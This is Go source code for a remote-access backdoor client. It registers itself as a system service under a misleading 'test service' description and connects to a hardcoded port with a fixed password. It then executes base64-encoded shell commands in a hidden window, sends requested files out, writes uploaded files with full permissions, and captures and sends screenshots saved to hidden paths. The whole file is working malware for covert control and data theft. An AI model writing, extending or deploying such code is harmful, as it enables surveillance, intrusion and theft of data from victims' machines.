package main

import (
	"io"
	"strings"
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"
	"bytes"
	"context"
	"runtime"
	"io/ioutil"
	"image/png"

	screenshot "github.com/kbinani/screenshot"
    "github.com/jander/golog/logger"
    "github.com/kardianos/service"
)

const (
	IP  = ":65521"
	CONNPWD = "shangxianmima22"
)
// 设置cmd执行超时的秒数
var Timeout    = 30 * time.Second

type program struct{}

func (p *program) Start(s service.Service) error {
    go p.run()
    return nil
}

func (p *program) run() {
    connect()
}

func (p *program) Stop(s service.Service) error {
    return nil
}

/**
 * MAIN函数，程序入口
 */
func main() {
    svcConfig := &service.Config{
        Name:        "MyClient", //服务显示名称
        DisplayName: "测试服务", //服务名称
        Description: "测试服务,用来测试socket长连接", //服务描述
    }

    prg := &program{}
    s, err := service.New(prg, svcConfig)
    if err != nil {
        logger.Fatal(err)
    }

    if err != nil {
        logger.Fatal(err)
    }

    if len(os.Args) > 1 {
        if os.Args[1] == "install" {
            s.Install()
            logger.Println("服务安装成功")
            return
        }

        if os.Args[1] == "remove" {
            s.Uninstall()
            logger.Println("服务卸载成功")
            return
        }
    }

    err = s.Run()
    if err != nil {
        logger.Error(err)
    }
}


// 获取不同操作系统的环境变量
func getScreenshotFilename()(string){
	var (
		filepath string

	)
	if runtime.GOOS == "windows" {
		filepath = os.Getenv("systemdrive") + "\\ProgramData\\tmp.png"
	}else{
		filepath = "/tmp/.tmp.png"
	}
	return filepath
}

// TakeScreenShot 截图功能,并存储到本地
func TakeScreenShot() {
	n := screenshot.NumActiveDisplays()
	fpath := getScreenshotFilename()
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			connect()
		}
		file, _ := os.Create(fpath)
		defer file.Close()
		png.Encode(file, img)
	}
}


func connect(){
	conn, err := net.Dial("tcp",IP)
	if err != nil{
		fmt.Println("Connection...")
		for {
			connect()
		}
	}
	errMsg := base64.URLEncoding.EncodeToString([]byte(CONNPWD))
	conn.Write([]byte(string(errMsg) + "\n"))
	fmt.Println("Connection success...")

	for {
		//等待接收指令，以 \n 为结束符，所有指令字符都经过base64
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err == io.EOF {
			// 如果服务器断开，则重新连接
			conn.Close()
			connect()
		}
		// 收到指令base64解码
		decodedCase,_ := base64.StdEncoding.DecodeString(message)
		command := string(decodedCase)

		switch command{
		case "back":
			conn.Close()
			connect()
		case "exit":
			conn.Close()
			os.Exit(0)

		
		case "download":
			// 第一步收到下载指令,什么都不做，继续等待下载路径
			download, _ := bufio.NewReader(conn).ReadString('\n')
			decodeDownload, _ := base64.StdEncoding.DecodeString(download)
			file, err := ioutil.ReadFile(string(decodeDownload))
			if err != nil {
				// 找不到文件，发送错误消息
				errMsg := base64.URLEncoding.EncodeToString([]byte("[!] File not found!"))
				conn.Write([]byte(string(errMsg) + "\n"))
				break
			}
			//发送一个download指令给服务器端准备接收
			srvDownloadMsg := base64.URLEncoding.EncodeToString([]byte("download"))
			conn.Write([]byte(string(srvDownloadMsg) + "\n"))
			//读文件上传
			encData := base64.URLEncoding.EncodeToString(file)
			conn.Write([]byte(string(encData) + "\n"))

			//上传完毕继续等待命令
			//message, err = bufio.NewReader(conn).ReadString('\n')
			//decodedCase,_ := base64.StdEncoding.DecodeString(message)
			//command = string(decodedCase)
			//fmt.Println(command)

		case "upload":
			uploadOutput, _ := bufio.NewReader(conn).ReadString('\n')
			decodeOutput, _ := base64.StdEncoding.DecodeString(uploadOutput)
			encData, _ := bufio.NewReader(conn).ReadString('\n')
			decData, _ := base64.URLEncoding.DecodeString(encData)
			ioutil.WriteFile(string(decodeOutput), []byte(decData), 777)
		case "screenshot":
			TakeScreenShot()
			file, err := ioutil.ReadFile(getScreenshotFilename())
			if err != nil {
				// 找不到文件，发送错误消息
				errMsg := base64.URLEncoding.EncodeToString([]byte("[!] File not found!"))
				conn.Write([]byte(string(errMsg) + "\n"))
				break
			}
			//发送一个download指令给服务器端准备接收
			srvDownloadMsg := base64.URLEncoding.EncodeToString([]byte("screenshot"))
			conn.Write([]byte(string(srvDownloadMsg) + "\n"))

			//读图片文件上传
			encData := base64.URLEncoding.EncodeToString(file)
			conn.Write([]byte(string(encData) + "\n"))

		case "getos":
			if runtime.GOOS == "windows" {
				command = "wmic os get name"
			}else{
				command = "uname -a"
			}
			fallthrough
		default:
			cmdArray := strings.Split(command," ")
			cmdSlice := cmdArray[1:len(cmdArray)]
			out,outerr := mCommand(cmdArray[0],cmdSlice...)
			if outerr !=nil{
				out = []byte(outerr.Error())
			}
			encoded := base64.StdEncoding.EncodeToString(out)
			conn.Write([]byte(string(encoded)+"\n"))
		}
	}
}

func mCommand(name string, arg ...string) ([]byte,error) {
    ctxt, cancel := context.WithTimeout(context.Background(), Timeout)
    defer cancel()
	// 通过上下文执行，设置超时
    cmd := exec.CommandContext(ctxt, name, arg...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	//cmd.SysProcAttr = &syscall.SysProcAttr{}

    var buf bytes.Buffer
    cmd.Stdout = &buf
    cmd.Stderr = &buf

    if err := cmd.Start(); err != nil {
        return buf.Bytes(), err
    }
	
    if err := cmd.Wait(); err != nil {
        return buf.Bytes(), err
    }
 
	return buf.Bytes(), nil
}